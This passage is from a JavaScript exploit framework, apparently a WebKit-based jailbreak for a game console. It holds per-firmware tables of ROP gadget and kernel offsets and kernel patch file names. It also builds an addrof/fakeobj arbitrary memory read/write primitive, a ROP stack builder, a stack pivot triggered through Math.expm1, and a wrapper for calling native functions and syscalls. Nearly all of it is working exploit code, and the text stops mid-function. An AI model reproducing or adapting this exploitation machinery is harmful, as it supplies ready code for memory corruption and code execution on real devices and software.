      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x211262b, // temp
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x15f8b08,
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x23c3a3,
      wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX: 0x2236a71,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1eab840,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x19b1061,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1920898,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2330_RAX_RET: 0x124df60,
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x2c31c8a,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x282233e,
      wk_expm1_builtin: 0x1d23560,
      wk___imp___error: 0x2f4a4d0,
      wk___imp_strerror: 0x2f4a520,
      wk_pthread_create: 0x4648,
      k__error: 0xcb80,
      c_strerror: 0x394f0,

      KPATCH: "900.bin",
      SYSENT_661: 0x1107f00,
      JMP_RSI_GADGET: 0x4c7ad,
      KL_LOCK: 0x3977f0,
      EVF_OFFSET: 0x7f6f27,
    },
    3: {
      KPATCH: "903.bin",
      SYSENT_661: 0x1103f00,
      JMP_RSI_GADGET: 0x5325b,
      KL_LOCK: 0x3959f0,
      EVF_OFFSET: 0x7f4ce7,
    },
    0x50: {
      wk_CSSFontFace_vtable: 0x2e93e78,
      wk_LEAVE_RET: 0x56322,
      wk_POP_R8_RET: 0x3fe32,
      wk_POP_R9_RET: 0xaaad51,
      wk_POP_R10_RET: 0x0, // missing
      wk_POP_R11_RET: 0x520109,
      wk_POP_R12_RET: 0x420ad1,
      wk_POP_R13_RET: 0x18fc4c1,
      wk_POP_R14_RET: 0x28c900,
      wk_POP_R15_RET: 0x1619db,
      wk_POP_RAX_RET: 0x11c46,
      wk_POP_RBX_RET: 0x13730,
      wk_POP_RCX_RET: 0x35a1e,
      wk_POP_RDI_RET: 0x5d19d,
      wk_POP_RDX_RET: 0x18de52,
      wk_POP_RSI_RET: 0x92a8c,
      wk_POP_RSP_RET: 0x253e0,
      wk_PUSH_RAX_POP_RBP_RET: 0x45569a,
      wk_PUSH_RDX_POP_RSP_RET: 0x80004a,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x10c07,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x232f2,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x12efb38,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x14e4c, // temp
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x1721ae3,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1cec2e0,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x11200f7,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2330_RAX_RET: 0x1bad320,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1c0af46,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x22e72c2, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x2c8126e,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x243e096,
      wk_expm1_builtin: 0xd05b0,
      wk___imp___error: 0x2f91ce0,
      wk___imp_strerror: 0x2f91d00,
      wk_pthread_create: 0x4748,
      k__error: 0xbb60,
      c_strerror: 0x357d0,

      KPATCH: "950.bin",
      SYSENT_661: 0x1100ee0,
      JMP_RSI_GADGET: 0x15a6d,
      KL_LOCK: 0x85ee0,
      EVF_OFFSET: 0x769a88,
    },
  },
  10: {
    0: {
      wk_CSSFontFace_m_clients: 0x58,
      wk_CSSFontFace_m_wrapper: 0x60,
      wk_CSSFontFace_m_status: 0x7a,
      wk_CSSFontFace_vtable: 0x3617a38,
      wk_FontFace_m_backing: 0x30,
      wk_TypedArray_flags: 0x20,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x28,
      wk_LEAVE_RET: 0x2ca6c3,
      wk_POP_R8_RET: 0xe881,
      wk_POP_R9_RET: 0x947b91,
      wk_POP_R11_RET: 0x0, // missing
      wk_POP_R12_RET: 0x1d83283,
      wk_POP_R13_RET: 0x15a945,
      wk_POP_R14_RET: 0x1a07f2,
      wk_POP_R15_RET: 0x495225,
      wk_POP_RAX_RET: 0xe882,
      wk_POP_RBX_RET: 0x4faa1,
      wk_POP_RCX_RET: 0x3a6c9,
      wk_POP_RDI_RET: 0x51056,
      wk_POP_RDX_RET: 0x1644b2,
      wk_POP_RSI_RET: 0xbe86,
      wk_POP_RSP_RET: 0x3a4af,
      wk_PUSH_RAX_POP_RBP_RET: 0x620b3,
      wk_PUSH_RDX_POP_RSP_RET: 0x168bc7a,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0xc037,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x7a170,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x24d28f8,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x22e31, // temp
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0xaa6d13,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x16b91a0,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x1fc94a7,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET: 0x1fd5520,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x1005476,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x29c8eed, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x29c8eed,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x29699b6,
      wk_expm1_builtin: 0x218bb70,
      wk___imp___error: 0x36d1bf0,
      wk___imp_strerror: 0x36d1c20,
      wk_pthread_create: 0x20c8,
      k__error: 0x14f40,
      c_strerror: 0x10d00,

      KPATCH: "1000.bin",
      SYSENT_661: 0x110a980,
      JMP_RSI_GADGET: 0x68b1,
      KL_LOCK: 0x45b10,
      EVF_OFFSET: 0x7b5133,
    },
    0x50: {
      wk_CSSFontFace_vtable: 0x361ba28,
      wk_LEAVE_RET: 0x38712,
      wk_POP_R8_RET: 0x2cd91,
      wk_POP_R9_RET: 0x58104d,
      wk_POP_R11_RET: 0x9d6a43,
      wk_POP_R12_RET: 0x66b813,
      wk_POP_R13_RET: 0xd8b71f,
      wk_POP_R14_RET: 0x14fda5,
      wk_POP_R15_RET: 0x393a35,
      wk_POP_RAX_RET: 0x2cd92,
      wk_POP_RBX_RET: 0x16af6e,
      wk_POP_RCX_RET: 0x1da1c,
      wk_POP_RDI_RET: 0x5b8a9,
      wk_POP_RDX_RET: 0x1d9eb,
      wk_POP_RSI_RET: 0x13b027,
      wk_POP_RSP_RET: 0x9512b,
      wk_PUSH_RAX_POP_RBP_RET: 0xe74f,
      wk_PUSH_RDX_POP_RSP_RET: 0x179186a,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x18b1b,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0xc4260,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x24d49c8,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0xaaee3, // temp
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x410583,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0xb1f280,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x10e302c,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET: 0x1f47620,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x19d3844,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x264efce, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x301a376,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x29e4b9a,

      wk_expm1_builtin: 0x218dcd0,
      wk___imp___error: 0x36d5be8,
      wk___imp_strerror: 0x36d5c18,
      wk_pthread_create: 0x20d8,
      k__error: 0x1470,

      KPATCH: "1050.bin",
      SYSENT_661: 0x110a5b0,
      JMP_RSI_GADGET: 0x50ded,
      KL_LOCK: 0x25e330,
      EVF_OFFSET: 0x7a7b14,
    },
  },
  11: {
    0: {
      wk_CSSFontFace_vtable: 0x3627aa8,
      wk_LEAVE_RET: 0x31f9d,
      wk_POP_R8_RET: 0xe53a2,
      wk_POP_R9_RET: 0x6403a1,
      wk_POP_R12_RET: 0x90d803,
      wk_POP_R13_RET: 0xab6981,
      wk_POP_R14_RET: 0x249e1,
      wk_POP_R15_RET: 0x272785,
      wk_POP_RAX_RET: 0x4e6a9,
      wk_POP_RBX_RET: 0xe16a,
      wk_POP_RCX_RET: 0x71617,
      wk_POP_RDI_RET: 0x357a0,
      wk_POP_RDX_RET: 0x10d11,
      wk_POP_RSI_RET: 0x249e2,
      wk_POP_RSP_RET: 0x927d1,
      wk_PUSH_RAX_POP_RBP_RET: 0x11b5e,
      wk_PUSH_RDX_POP_RSP_RET: 0x1cc607a,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x97db,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x2e5d4b,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x24dae58,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0xe70c5, // temp
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x11d5d53,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x2f1890,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x41a81,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET: 0x1ff1a90,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x90ffe6,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x2a68f06, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x29c098a,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x29da341,

      wk_expm1_builtin: 0x2193f30,
      wk___imp___error: 0x36e1c68,
      wk___imp_strerror: 0x36e1c98,
      wk_pthread_create: 0x2068,
      k__error: 0x3370,

      KPATCH: "1100.bin",
      SYSENT_661: 0x1109350,
      JMP_RSI_GADGET: 0x71a21,
      KL_LOCK: 0x58f10,
      EVF_OFFSET: 0x7fc26f,
    },
    2: {
      wk_POP_R9_RET: 0x6403b1,
      wk_POP_R12_RET: 0x90d813,
      wk_POP_R15_RET: 0x272775,
      wk_POP_RAX_RET: 0x116d4,
      wk_POP_RDI_RET: 0x272776,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x24dae68,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET: 0x1ff1aa0,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x90fff6,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x2a68f26, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x29c09aa,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x29da361,

      wk_expm1_builtin: 0x2193f40,

      KPATCH: "1102.bin",
      EVF_OFFSET: 0x7fc22f,
    },
  },
};

const constants = new Proxy(constants_map, {
  get(target, prop) {
    if (constants_cache.has(prop)) {
      return constants_cache.get(prop);
    }

    for (let major = version.major; major >= 0; major--) {
      if (major in target) {
        for (let minor = major === version.major ? version.minor : 0xff; minor >= 0; minor--) {
          if (minor in target[major] && prop in target[major][minor]) {
            const value = target[major][minor][prop];
            if (value === null) {
              throw new Error(`${prop} offset is not supported for ${version}`);
            }

            constants_cache.set(prop, value);
            return value;
          }
        }
      }
    }

    throw new Error(`${version} has no ${prop} !!`);
  },
});

//#region Constants
// used for rop
const fn = {};
const structs = new Map();
const syscalls = new Map();

// used for errno
let _error_addr = undefined;
let strerror_addr = undefined;

// used for base addrs
let webkit_base = undefined;
let libc_base = undefined;
let libkernel_base = undefined;

const mem = {
  allocs: new Set(),
  alloc(len, ptr = true) {
    const ab = new ArrayBuffer(len);
    this.allocs.add(ab);
    return ptr ? ab.data() : ab;
  },
  free(ab) {
    return this.allocs.delete(ab);
  },
  free_all() {
    for (const ab of this.allocs) {
      // fix to avoid crash
      if (ab.hasOwnProperty("m_data")) {
        const ab_addr = arw.addrof(ab);

        let m_impl = arw.view(ab_addr).getBInt(0x10, true);

        if (version.major === 6) {
          m_impl = m_impl.xor(g_JSArrayBufferPoison);
        }

        arw.view(m_impl).setBInt(0, 0, true); // DeferrableRefCountedBase::m_refCount
        arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true); // m_contents.m_data

        // m_contents.m_sizeInBytes
        if (version.major === 9) {
          arw.view(m_impl).setInt32(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
        } else {
          arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
        }
      }
    }

    this.allocs.clear();
  },
  copy(dst, src, len) {
    const src_u8 = new Uint8Array(ArrayBuffer.from(src, len));
    const dst_u8 = new Uint8Array(ArrayBuffer.from(dst, len));

    dst_u8.set(src_u8);
  },
  bset(addr, len, value = 0) {
    const u8 = new Uint8Array(ArrayBuffer.from(addr, len));
    u8.fill(value);
  },
  strlen(addr, max = 0x3fff) {
    const u8 = new Uint8Array(ArrayBuffer.from(addr, max));

    const len = u8.indexOf(0);
    if (len === -1) {
      throw new Error("Invalid null-terminated string !!");
    }

    return len;
  },
};
const arw = {
  leak: { obj: 0 },
  leak_addr: undefined,
  master: undefined,
  victim: new DataView(new ArrayBuffer(0x30)),
  view(addr) {
    if (addr.eq(0)) {
      throw new Error("Empty addr !!");
    }

    this.master[4] = addr.lo;
    this.master[5] = addr.hi;

    return this.victim;
  },
  addrof(obj) {
    this.leak.obj = obj;
    return this.view(this.leak_addr).getBInt(0x10, true);
  },
  fakeobj(addr) {
    this.view(this.leak_addr).setBInt(0x10, addr, true);
    return this.leak.obj;
  },
};
const rop = {
  stack: undefined,
  frame: undefined,
  pivot: undefined,
  insts: [],
  reset() {
    this.stack.reset();
    this.frame.reset();
  },
  execute() {
    rop.frame.set_value("jmp_rax", gadgets.POP_RAX_RET);

    this.stack.prepare(this.insts, this.frame);
    this.pivot.prepare(this.stack.sp);

    const pivot_obj = {};
    const pivot_obj_addr = arw.addrof(pivot_obj);

    const empty_jscell = arw.view(pivot_obj_addr).getBInt(0, true);

    const pivot_addr = this.pivot.addr;
    arw.view(pivot_obj_addr).setBInt(0, pivot_addr, true);

    Math.expm1(pivot_obj);

    arw.view(pivot_obj_addr).setBInt(0, empty_jscell, true);
  },
};
const gadgets = new Proxy(constants, {
  get(target, prop) {
    return webkit_base + target[`wk_${prop}`];
  },
});
//#endregion
//#region Classes
class SyscallError extends Error {
  constructor(message) {
    super(`${message}\n\terrno ${errno()}: ${strerror()}`);
    this.name = "SyscallError";
  }
}
class Stack {
  constructor(size) {
    if (size % 8 !== 0) {
      throw new Error("Invalid stack size, not aligned by 8 bytes");
    }

    if (size < 0x1000) {
      throw new Error("Invalid stack size, minimal size is 0x1000 to init ROP");
    }

    this.view = new DataView(new ArrayBuffer(size));
    this.reset();
  }

  reset() {
    new Uint8Array(this.view.buffer).fill(0);
    this.offset = this.view.byteLength;
  }

  get sp() {
    return this.view.buffer.data().add(this.offset);
  }

  /**
   * @param {Array} insts
   * @param {Frame} frame
   */
  prepare(insts, frame) {
    this.reset();

    for (let i = insts.length - 1; i >= 0; i--) {
      if (this.current < 1) {
        throw new Error("Stack full !!");
      }

      let inst = insts[i];

      if (typeof inst === "string") {
        if (typeof frame === "undefined") {
          throw new Error("Unable to resolve symbol without frame !!");
        }

        inst = frame.instof(inst);
      }

      this.offset -= 8;
      this.view.setBInt(this.offset, inst, true);
    }
  }
}
class Frame {
  constructor(list) {
    if (!Array.isArray(list)) {
      throw new Error(`Input frame is not an array !!`);
    }

    if (list.length === 0) {
      throw new Error("Empty frame length !!");
    }

    this.pop_view = new DataView(new ArrayBuffer(8));
    this.view = new DataView(new ArrayBuffer(list.length * 8));

    for (let i = 0; i < list.length; i++) {
      const name = list[i];

      if (typeof name !== "string") {
        throw new TypeError(`${name} not a string !!`);
      }

      if (name in this) {
        throw new Error(`Duplicated local variable ${name} !!`);
      }

      this[name] = i;
    }
  }

  reset() {
    new Uint8Array(this.view.buffer).fill(0);
  }

  instof(name) {
    let as_value = false;

    if (name.startsWith("[") && name.endsWith("]")) {
      name = name.slice(1, -1);
      as_value = true;
    }

    if (name in this) {
      return as_value ? this.get_value(name) : this.addrof(name);
    }

    throw new Error(`${name} not in frame !!`);
  }

  addrof(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.buffer.data().add(this[name] * 8);
  }

  get_value(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.getBInt(this[name] * 8, true);
  }

  set_value(name, value) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    this.view.setBInt(this[name] * 8, value, true);
  }

  valueof(insts, name) {
    insts.push(`[${name}]`);
  }

  store(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RDI_RET);
    insts.push(name);
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  }

  load(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RDI_RET);
    insts.push(name);
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET);
  }

  pop(insts, gadget, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RAX_RET);
    insts.push(gadget);
    insts.push(gadgets.POP_RDI_RET);
    insts.push(this.pop_view.buffer.data());
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    insts.push(gadgets.POP_RBX_RET);
    insts.push(name);
    insts.push(gadgets.POP_RAX_RET);
    insts.push(this.pop_view.buffer.data());
    insts.push(gadgets.PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX);
  }
}
class Pivot {
  constructor() {
    this.store_view = new DataView(new ArrayBuffer(constants.store_view_size));
    this.pivot_view = new DataView(new ArrayBuffer(0x28));

    this.store_view.setBInt(constants.store_view_entry, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18, true);
    this.store_view.setBInt(0x10, gadgets.MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);
    this.store_view.setBInt(0x18, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);

    if (version.major === 6 && version.minor <= 0x20) {
      this.pivot_view.setBInt(8, gadgets.PUSH_RDI_POP_RSP_RET, true);
      this.pivot_view.setBInt(0x20, gadgets.MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8, true);
    } else {
      this.pivot_view.setBInt(0x10, gadgets.PUSH_RDX_POP_RSP_RET, true);
      this.pivot_view.setBInt(0x20, gadgets.MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);
    }
  }

  get addr() {
    return this.store_view.buffer.data();
  }

  prepare(sp) {
    this.store_view.setBInt(8, this.pivot_view.buffer.data(), true);

    this.pivot_view.setBInt(0, this.pivot_view.buffer.data(), true);
    this.pivot_view.setBInt(constants.pivot_view_sp, sp, true);
  }
}
class NativeFunction {
  constructor(input, ret) {
    this.ret = ret;

    if (input instanceof BInt) {
      this.addr = input;
    } else if (typeof input === "number") {
      if (!syscalls.has(input)) {
        throw new Error(`Syscall ${input} not found !!`);
      }

      this.addr = syscalls.get(input);
    }
  }

  invoke() {
    if (arguments.length > 6) {
      throw new Error("More than 6 arguments is not supported !!");
    }

    rop.reset();

    rop.frame.set_value("rip", this.addr);
    rop.frame.set_value("rax", 0);

    const ctx = [];
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];

    for (let i = 0; i < regs.length; i++) {
      const reg = regs[i];

      let value = i in arguments ? arguments[i] : 0;

      switch (typeof value) {
        case "boolean":
        case "number":
          break;
        case "string":
          value = value.cstr();
          ctx.push(value);
          break;
        default:
          if (!(value instanceof BInt)) {
            throw new Error(`Invalid value of type ${typeof value} at arg ${i}`);
          }
      }

      rop.frame.set_value(reg, value);
    }

    rop.execute();

    while (ctx.length > 0) {
      mem.free(ctx.pop());
    }

    let result;
    if (this.ret) {
      result = rop.frame.get_value("rax");

      switch (this.ret) {
        case "bint":
          break;
        case "number":
          result = result.i;
          break;
        case "boolean":
          result = result.eq(1);
          break;
        case "string":
          result = String.from(result);
          break;
        default:
          throw new Error(`Unsupported return type ${this.ret}`);
      }
    }

    return result;
  }

  chain() {
    if (arguments.length < 1) {
      throw new Error("insts argument is required to chain with !!");
    }

    if (!Array.isArray(arguments[0])) {
      throw new Error(`insts argument is not an array !!`);
    }

    if (arguments.length > 7) {
      throw new Error("More than 6 arguments is not supported !!");
    }

    const regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_RET];

    const insts = arguments[0];

    insts.push(gadgets.POP_RAX_RET);
    insts.push(0);

    for (let i = 1; i < arguments.length; i++) {
      const reg = regs[i - 1];

      insts.push(reg);

      let value = arguments[i];

      switch (typeof value) {
        case "boolean":
        case "number":
          break;
        case "string":
          value = value.cstr();
          break;
        default:
          if (!(value instanceof BInt)) {
            throw new Error(`Invalid value at arg ${i - 1}`);
          }
      }

      insts.push(value);
    }

    //if (insts.length % 2 === 0) {
    //  insts.push(gadgets.RET); // alignment for xmm/ymm
    //}

    insts.push(this.addr);

    //if (insts.length % 2 === 0) {
    //  insts.push(gadgets.RET); // alignment for xmm/ymm
    //}
  }
}
class Struct {
  constructor(name, fields) {
    if (structs.has(name)) {
      return structs.get(name);
    }

    if (!Array.isArray(fields)) {
      throw new Error("Input fields is not an array !!");
    }

    if (fields.length === 0) {
      throw new Error("Empty fields array !!");
    }

    let offset = 0;
    let alignof = 1;

    this.fields = {};

    for (const field of fields) {
      field.size = Struct.type_size(field.type);
      field.align = Struct.type_align(field.type);
      field.offset = offset = offset.alignUp(field.align);
      field.count = field.count || 1;

      offset += field.size * field.count;
      alignof = Math.max(alignof, field.align);

      this.fields[field.name] = field;
    }

    this.name = name;
    this.sizeof = offset.alignUp(alignof);
    this.alignof = alignof;

    logger.debug(`registering ${this.name}: sizeof: ${this.sizeof}, alignof: ${this.alignof}`);

    structs.set(this.name, this);
  }

  new(addr) {
    const instance = { addr: addr === undefined ? mem.alloc(this.sizeof) : addr, struct: this };
    return new Proxy(instance, {
      get: (target, prop) => {
        if (prop in target) return target[prop];

        if (!isNaN(prop)) {
          const i = Number(prop);
          return target.struct.new(target.addr.add(i * target.struct.sizeof));
        }

        const field = target.struct.fields[prop];
        if (!field) return undefined;

        let type = field.type;
        let addr = target.addr.add(field.offset);

        if (field.count > 1) {
          const size = field.size * field.count;
          const buf = ArrayBuffer.from(addr, size);

          switch (type) {
            case "Int8":
              return new Int8Array(buf);
            case "Uint8":
              return new Uint8Array(buf);
            case "Int16":
              return new Int16Array(buf);
            case "Uint16":
              return new Uint16Array(buf);
            case "Int32":
              return new Int32Array(buf);
            case "Uint32":
              return new Uint32Array(buf);
            case "Int64":
            case "Uint64":
              throw new Error(`type ${field.type} not supported !!`);
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        } else {
          if (type.endsWith("*")) {
            type = type.slice(0, -1);
            addr = arw.view(target.addr).getBInt(field.offset, true);
          }

          if (structs.has(type)) {
            const struct = structs.get(type);
            return struct.new(addr);
          }

          switch (type) {
            case "Int8":
              return arw.view(addr).getInt8(0, true);
            case "Uint8":
              return arw.view(addr).getUint8(0, true);
            case "Int16":
              return arw.view(addr).getInt16(0, true);
            case "Uint16":
              return arw.view(addr).getUint16(0, true);
            case "Int32":
              return arw.view(addr).getInt32(0, true);
            case "Uint32":
              return arw.view(addr).getUint32(0, true);
            case "Int64":
            case "Uint64":
              return arw.view(addr).getBInt(0, true);
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        }
      },
      set: (target, prop, value) => {
        if (!isNaN(prop)) {
          const i = Number(prop);
          if (!value.hasOwnProperty("struct")) {
            throw new Error("Value is not a Struct");
          }

          if (target.struct.name !== value.struct.name) {
            throw new Error(`Expected ${target.struct.name} got ${value.struct.name} !!`);
          }

          mem.copy(target.addr + i * target.struct.sizeof, value.addr, target.struct.sizeof);
        } else {
          const field = target.struct.fields[prop];
          if (!field) return undefined;

          let type = field.type;
          let addr = target.addr.add(field.offset);

          if (field.count > 1) {
            const size = field.size * field.count;

            if (!ArrayBuffer.isView(value)) {
              throw new Error("Value is not a TypedArray");
            }

            if (value.buffer.byteLength !== size) {
              throw new Error(`Expected ${size} bytes got ${value.buffer.byteLength} !!`);
            }

            mem.copy(addr, value.buffer.getBackingStore(), size);
          } else {
            if (type.endsWith("*")) {
              if (!(value instanceof BInt)) {
                throw new Error("Value is not a pointer");
              }

              arw.view(target.addr).setBInt(field.offset, value, true);
              return;
            }

            if (structs.has(type)) {
              const struct = structs.get(type);

              if (!value.hasOwnProperty("addr")) {
                throw new Error("Value is not a Struct");
              }

              mem.copy(addr, value.addr, struct.sizeof);
              return;
            }

            switch (type) {
              case "Int8":
                arw.view(addr).setInt8(0, value, true);
                break;
              case "Uint8":
                arw.view(addr).setUint8(0, value, true);
                break;
              case "Int16":
                arw.view(addr).setInt16(0, value, true);
                break;
              case "Uint16":
                arw.view(addr).setUint16(0, value, true);
                break;
              case "Int32":
                arw.view(addr).setInt32(0, value, true);
                break;
              case "Uint32":
                arw.view(addr).setUint32(0, value, true);
                break;
              case "Int64":
              case "Uint64":
                arw.view(addr).setBInt(0, value, true);
                break;
              default:
                throw new Error(`Invalid type ${field.type}`);
            }
          }
        }

        return true;
      },
    });
  }

  static type_size(type) {
    if (type.endsWith("*")) {
      return 8;
    } else if (structs.has(type)) {
      return structs.get(type).sizeof;
    } else {
      return Struct.primitive_size(type);
    }
  }

  static type_align(type) {
    if (type.endsWith("*")) {
      return 8;
    } else if (structs.has(type)) {
      return structs.get(type).alignof;
    } else {
      return Struct.primitive_size(type);
    }
  }

  static primitive_size(type) {
    const bits = type.replace(/\D/g, "");
    if (bits % 8 !== 0) {
      throw new Error(`Invalid primitive type ${type}`);
    }

    return bits / 8;
  }
}
//#endregion
//#region Extensions

ArrayBuffer.prototype.data = function () {
  const ab_addr = arw.addrof(this);

  let m_impl = arw.view(ab_addr).getBInt(0x10, true);

  if (version.major === 6) {
    m_impl = m_impl.xor(g_JSArrayBufferPoison);
  }

  return arw.view(m_impl).getBInt(constants.wk_ArrayBuffer_m_contents_m_data, true); // m_data
};

String.prototype.cstr = function () {
  const ab = mem.alloc(this.length + 1, false);
  const u8 = new Uint8Array(ab);

  for (let i = 0; i < this.length; i++) {
    u8[i] = this.charCodeAt(i) & 0xff;
  }

  u8[this.length] = 0;

  return ab.data();
};
//#endregion
//#region Static
String.from = function (addr, len) {
  if (addr.eq(0)) return "";

  len = len || mem.strlen(addr);

